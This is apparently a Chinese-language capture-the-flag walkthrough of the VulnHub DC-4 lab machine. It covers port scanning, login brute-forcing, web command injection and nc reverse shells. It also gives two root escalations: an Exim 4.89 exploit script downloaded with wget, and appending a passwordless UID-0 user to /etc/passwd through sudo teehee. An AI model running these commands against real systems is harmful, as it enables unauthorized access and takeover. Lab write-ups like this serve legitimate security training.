vulnhub-DC-4

目标靶机IP地址为 192.168.93.8

使用Nmap进行全端口扫描

nmap -A -p- 192.168.93.8

目标开放80端口和22端口

浏览器访问 http://192.168.93.8

一个登录界面

使用 BurpSuite 抓取登录数据包进行爆破

爆破成功，用户名 admin 密码 happy

使用账号密码登录

登录进去后，就只有一个超链接，点击

有三个选项，点击Run按钮后，发现执行了命令

抓包修改，发现可以执行任意命令

本地监听，使用nc反弹一个shell

nc -lvvp 6666

nc -e /bin/bash 192.168.93.7 6666

使用Python获取一个交互式的shell

python -c 'import pty;pty.spawn("/bin/bash")'

提权方法一：

查找具有root权限的suid的文件

find / -perm -u=s -type f 2>/dev/null

发现有 exim4，查看版本信息

exim4 --version

版本 4.89，使用 searchsploit 搜索历史漏洞

searchsploit exim

找到一个可用于本地提权的shell脚本

将脚本复制到当前目录

cp /usr/share/exploitdb/exploits/linux/local/46996.sh .

因为该脚本是在Windows下编写的，直接运行会报错 bash: ./46996.sh: /bin/bash^M: bad interpreter: No such file or directory，这是因为在Windows平台下，换行符是 \r\n，而在Linux平台下是 \n，将在Windows平台下编辑过的文件复制到Linux平台下 \r 被会解释成 ^M

解决办法1

使用vim打开文件
利用命令查看文件格式 :set ff 或 :set fileformat
可以看到信息 fileformat=dos 或 fileformat=unix
利用命令修改文件格式 :set ff=unix 或 :set fileformat=unix
:wq (存盘退出)

解决办法2

busybox dos2unix 46996.sh

解决办法3

在exploit-db上找这个脚本，拿到Linux环境下面编辑

https://www.exploit-db.com/exploits/46996

将脚本上传到靶机上

首先使用Python监听一个Web服务

python3 -m http.server

使用wget将脚本文件下载到靶机 tmp 目录

wget http://192.168.93.7:8000/46996.sh -O /tmp/46996.sh

赋予可执行权限

chmod +x /tmp/46996.sh

查看脚本内容，发现脚本需要接收一个 -m 参数（-m setuid 或者是-m netcat）

本地nc监听

nc -lvvp 8888

运行脚本

/tmp/46996.sh -m netcat

netcat -e /bin/bash 192.168.93.7 8888

提权方法二：

在jim用户家目录下的 backups 目录发现密码备份文件 old-passwords.bak，将这份密码文件下载下来，然后用来爆破 jim 用户的密码

hydra -l jim -P old-passwords.bak ssh://192.168.93.8

得到用户 jim 的密码 jibril04，SSH登陆

查看 /var/mail/jim，得到用户charles的密码 ^xHhA&hvim0y

切换到charles用户

su charles

执行 sudo -l 命令，发现该用户可以使用无密码以root权限运行teehee

查看teehee命令的用法，发现teehee的-a参数可以在文件末尾追加内容，可以利用其在 /etc/passwd 文件末尾添加一个用户，并指定其有root权限

追加内容格式

[用户名]:[密码]:[UID]:[GID]:[身份描述]:[主目录]:[登录shell]
demo::0:0:::/bin/bash

执行命令添加用户

echo "demo::0:0:::/bin/bash" | sudo teehee -a /etc/passwd

切换用户查看flag
